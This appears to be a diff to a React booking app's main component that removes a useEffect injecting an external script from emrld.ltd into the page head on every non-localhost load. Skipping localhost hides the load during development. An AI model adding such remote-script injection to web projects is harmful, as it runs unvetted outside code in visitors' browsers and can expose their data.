@@ -66,22 +66,6 @@ function NotFound() {
 
 export default function App() {
 
-useEffect(() => {
-  // optional: skip in dev to avoid 403 noise
-  if (window.location.hostname === "localhost") return;
-
-  const existingScript = document.querySelector(
-    "script[src='https://emrld.ltd/NTM5MT72.js?t=539172']"
-  );
-
-  if (!existingScript) {
-    const script = document.createElement("script");
-    script.async = true;
-    script.src = "https://emrld.ltd/NTM5MT72.js?t=539172";
-    document.head.appendChild(script);
-  }
-}, []);
-
   return (
     <BookingProvider>
       <BrowserRouter>
